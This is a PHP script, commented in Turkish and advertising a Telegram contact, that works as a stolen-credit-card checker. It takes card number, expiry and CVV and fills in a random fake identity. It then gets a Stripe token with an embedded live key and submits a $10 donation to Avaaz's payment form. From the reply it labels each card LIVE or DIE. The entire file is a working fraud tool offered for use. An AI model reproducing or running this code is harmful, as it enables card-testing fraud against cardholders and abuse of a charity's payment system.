<?php
/**
 * CC Checker API - Stripe + Avaaz
 * Telegram: @zahettim
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

error_reporting(0);

$cc = $_GET['cc'] ?? $_POST['cc'] ?? null;

if (!$cc) {
    echo json_encode([
        'success' => false,
        'error' => 'CC bilgisi gerekli',
        'format' => 'kart|ay|yil|cvv (örn: 4818081161475565|07|30|853)',
        'telegram' => '@zahettim'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$separa = explode("|", $cc);
if (count($separa) < 4) {
    echo json_encode([
        'success' => false,
        'error' => 'Format hatalı! Kart|Ay|Yıl|CVV',
        'telegram' => '@zahettim'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$card = $separa[0];
$month = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

// Rastgele kullanıcı bilgileri
function getRandomUser() {
    $data = json_decode(file_get_contents('https://randomuser.me/api/1.2/?nat=us'), true);
    $user = $data['results'][0];
    return [
        'first' => $user['name']['first'],
        'last' => $user['name']['last'],
        'email' => $user['email'],
        'street' => $user['location']['street']['name'],
        'city' => $user['location']['city'],
        'state' => $user['location']['state'],
        'postcode' => $user['location']['postcode'],
        'phone' => $user['phone']
    ];
}

$user = getRandomUser();

// BIN Lookup
function getBinInfo($cc) {
    $bin = substr($cc, 0, 6);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/{$bin}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    $data = curl_exec($ch);
    curl_close($ch);
    
    $json = json_decode($data, true);
    return [
        'bank' => $json['bank']['name'] ?? 'Bilinmiyor',
        'scheme' => $json['scheme'] ?? 'Bilinmiyor',
        'type' => $json['type'] ?? 'Bilinmiyor',
        'country' => $json['country']['name'] ?? 'Bilinmiyor'
    ];
}

// Stripe Token al
function getStripeToken($card, $month, $year, $cvv) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]={$card}&card[exp_month]={$month}&card[exp_year]={$year}&card[cvc]={$cvv}&key=pk_live_Reu0iyvtI4irr4oHuGKWz3v2");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    return $data['id'] ?? null;
}

// Donasyon dene
function checkDonation($token, $email) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://secure.avaaz.org/donate/DonationStripeSubmit.php?preview=yes');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "amount=10&currency=USD&firstName=John&lastName=Doe&Email={$email}&CountryID=81&zip=10001&paymentType=creditcard&stripeToken={$token}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Ana işlem
$binInfo = getBinInfo($card);
$token = getStripeToken($card, $month, $year, $cvv);

if (!$token) {
    echo json_encode([
        'success' => false,
        'status' => '❌ DIE',
        'card' => $card,
        'message' => 'Token alınamadı! Kart geçersiz.',
        'bin_info' => $binInfo,
        'telegram' => '@zahettim'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$donationResult = checkDonation($token, $user['email']);

// Sonuç analizi
if (strpos($donationResult, 'Payment Successful') !== false || strpos($donationResult, 'Thank') !== false) {
    $status = '✅ LIVE';
    $message = 'Ödeme başarılı! Kart aktif.';
} elseif (strpos($donationResult, 'Insufficient Funds') !== false) {
    $status = '✅ LIVE';
    $message = 'Yetersiz bakiye ama kart aktif!';
} elseif (strpos($donationResult, 'Do Not Honor') !== false) {
    $status = '✅ LIVE';
    $message = 'Kart aktif ama işlem reddedildi (%50).';
} elseif (strpos($donationResult, 'security code is incorrect') !== false) {
    $status = '✅ LIVE';
    $message = 'Kart aktif ama CVV hatalı!';
} else {
    $status = '❌ DIE';
    $message = 'Kart geçersiz veya reddedildi.';
}

echo json_encode([
    'success' => true,
    'status' => $status,
    'card' => $card,
    'month' => $month,
    'year' => $year,
    'cvv' => $cvv,
    'message' => $message,
    'bin_info' => $binInfo,
    'telegram' => '@zahettim'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>